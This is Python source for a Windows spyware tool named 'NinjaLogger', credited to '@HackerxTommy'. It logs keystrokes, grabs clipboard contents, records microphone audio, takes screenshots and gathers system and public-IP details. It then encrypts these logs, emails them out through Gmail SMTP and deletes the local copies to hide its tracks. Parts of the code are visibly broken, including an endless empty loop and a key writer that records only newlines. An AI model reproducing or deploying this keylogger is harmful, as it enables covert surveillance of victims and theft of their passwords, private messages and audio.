#Author : @HackerxTommy

# Libraries

#for email logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#for realtime connections
import socket
import platform

#for clipboard  info
import win32clipboard

#for keystrokes/keylogging logging keys
from pynput.keyboard import Key, Listener
 
 
 
#for tracking systeminfo time 
import time
import os

#for microphone functionality
from scipy.io.wavfile import write
import sounddevice as sd



#for getting user info and some more systeminfo

import getpass
import requests

#for screenshotting images using pillow

from multiprocessing import Process,freeze_support
from PIL import ImageGrab

# for cryptography fernet information 

from cryptography.fernet import Fernet

keys_information= "key_log.txt"
system_info = "system_info.txt"
clipboard_information="clipboard_info.txt"


microphone_time = 10
audio_information= "audio_info.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard_info.txt"

time_iterations= 15
number_of_iterations_end = 3

email_address="Your Email Address"
password="Your Device SMTP Password"

username = getpass.getuser()



toaddr="Sending Address"

key= "Your encrption_key"

file_path= r"C:\NinjaLogger"
extend = "\\"
file_merge = file_path + extend

# email controls

def send_email(filename,attachment,toaddr):
    fromaddr=email_address
    msg=MIMEMultipart()
    
    msg['From']=fromaddr
    msg['To'] = toaddr
    msg['Subject'] ="Log File"
    body = "Ninjalogger_Results"
    
    msg.attach(MIMEText(body , 'plain'))
    filename = filename
    attachment = open(attachment,'rb')
    
    p= MIMEBase('application' , 'octet-stream')
    
    p.set_payload((attachment).read())
    
    encoders.encode_base64(p)
    
    p.add_header('Content-Disposition', "attachment; filename =%s" %filename)
    msg.attach(p)
    
    s=smtplib.SMTP('smtp.gmail.com',587)
    
    s.starttls()
    
    s.login(fromaddr,password)
    text= msg.as_string()
    
    s.sendmail(fromaddr, toaddr, text)
    
    s.quit()

send_email(keys_information,file_path +extend + keys_information,toaddr)


# get the computer information


def computer_information():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        
        services = [
            "https://api.ipify.org",
            "https://ifconfig.me/ip",
            "https://ident.me",
            "https://ipinfo.io/ip"
        ]

        public_ip = None
        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    public_ip = response.text.strip()
                    break
            except:
                continue

        if public_ip:
            f.write("Public IP Address: " + public_ip + "\n")
        else:
            f.write("Couldn't get Public IP Address (most likely max query)\n")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipbpard contents

def copy_clipboard():
    with open(file_path+ extend + clipboard_information ,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data= win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            f.write("Clipboard Data: \n" + pasted_data)
            
        except:
        
            f.write("Clipboard could not be copied")
            
copy_clipboard()

# get the microphone

def microphone():
    fs=44100
    seconds = microphone_time
    
    myrecording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
    sd.wait()
    
    write(file_path+ extend + audio_information,fs,myrecording)
        
microphone()

# get the screenshot

def screenshot():
    im= ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations= 0
currentTime = time.time()
stoppingTime = time.time() + time_iterations

#Timer for keylogger

while number_of_iterations < number_of_iterations_end:
    count =0
keys=[]


def on_press(key):
    global keys, count ,currentTime
    
    print(key)
    keys.append(key)
    count+=1
    currentTime = time.time()
    
    if count >=1:
        count=0
        write_file(keys)
        keys=[]
    

def write_file(keys):
    with open(file_path + extend + keys_information ,"a") as f:
        for key in keys:
            k= str(key).replace("'","")
            if k.find("space") > 0 :
                f.write('\n')
                f.close()
                
                
def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
         return False
    
with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()
    
    if currentTime > stoppingTime:
        
        with open(file_path + extend  + keys_information , "w") as f :
            f.write(" ")
            
            
        screenshot()
        send_email(screenshot , file_path + extend + screenshot_information , toaddr)
        copy_clipboard()
        number_of_iterations+=1
        currentTime = time.time()
        stoppingTime = time.time() + time_iterations
        
# Encrypted files
files_to_encrypt = [file_merge + system_info , file_merge + clipboard_information, file_merge+ keys_information]       
encrypted_filename = [file_merge + system_information_e, file_merge + clipboard_information_e , file_merge+ keys_information_e]
    
count =0
    
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count],'rb')as f :
        data = f.read()
    
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    
    with open(encrypted_filename[count] , 'wb') as f:
        f.write(encrypted)
        
    send_email(encrypted_filename[count] , encrypted_filename[count] , toaddr)
    count +=1
time.sleep(120)

#clean up our tracks and delete files

delete_files = [system_info , clipboard_information ,keys_information, screenshot_information , audio_information]
for file in delete_files:
    os.remove(file_merge + file)
    
    
    
 